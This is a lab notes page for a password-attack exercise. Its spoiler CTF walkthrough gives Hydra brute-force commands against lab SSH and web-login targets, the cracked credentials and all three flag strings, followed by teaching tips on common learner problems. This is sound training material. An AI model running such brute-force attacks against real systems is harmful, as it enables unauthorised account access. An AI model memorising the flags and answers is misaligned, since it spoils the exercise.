---
title: "Lab 6 Notes: Password Attacks"
---

## CTF walkthrough (spoiler)

Two flags on `lab6-ssh` (10.10.6.10), plus a bonus flag on the web login
form on `lab6-web` (10.10.6.11). Targets `10.10.6.0/24` only, attack from
`lab6-attacker`, flag format `flag{...}`.

### Step 1: Brute-force SSH accounts

```bash
hydra -L <(printf "admin\nuser1\n") -P /wordlists/basic.txt ssh://10.10.6.10
```

Recovers `admin:letmein` and `user1:qwerty` (both are in
`/wordlists/basic.txt`).

### Step 2: user.txt

```bash
ssh admin@10.10.6.10
# password: letmein
cat user.txt
```

Flag: `flag{lab6_password_cracked_ssh}`

### Step 3: root.txt

```bash
ssh user1@10.10.6.10
# password: qwerty
cat root.txt
```

Flag: `flag{lab6_rockyou_wordlist_win}`

### Bonus: web login flag

```bash
hydra -l admin -P /wordlists/basic.txt 10.10.6.11 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid username or password"
curl -s -X POST -d "user=admin&pass=letmein" http://10.10.6.11/login
```

Response includes: `flag{lab6_hydra_web_login_cracked}`

### Lesson

Every credential here was in a 10-entry wordlist. Real breach-derived
wordlists (rockyou.txt has 14 million+ entries) make this dramatically
worse for weak passwords — which is why "complex enough to resist a
wordlist" is a much lower bar than most people think.

## Common sticking points

- **Exercise 2 (shadow-style hash, `/hashes/john-format.txt`) has no
  answer key in the source material.** None of the 10 entries in
  `basic.txt` crack the MD5-crypt hash (`svc_backup:$1$xyzabc$...`) — it
  genuinely requires the full `rockyou.txt` inside the attacker container
  (`/usr/share/wordlists/rockyou.txt`) to crack, and the exact plaintext
  isn't fixed anywhere in the lab's README/worksheet/CTF files. Let
  learners run it against rockyou themselves and expect it to take longer
  than the other exercises; don't expect a single canonical answer to give
  them.
- The web login form (`lab6-web`) always returns HTTP `200 OK` regardless
  of success or failure — learners who assume Hydra can use the status
  code will get stuck on Exercise 7 until they read the response body
  requirement for `http-post-form` more carefully.
- `user1`'s SSH password (`qwerty`) doubles as the plaintext behind the
  Hashcat SHA-256 exercise (`medium-sha256.txt`) — this is intentional
  reuse in the lab data, not an error, but it can confuse learners who
  expect every exercise's answer to be unique.
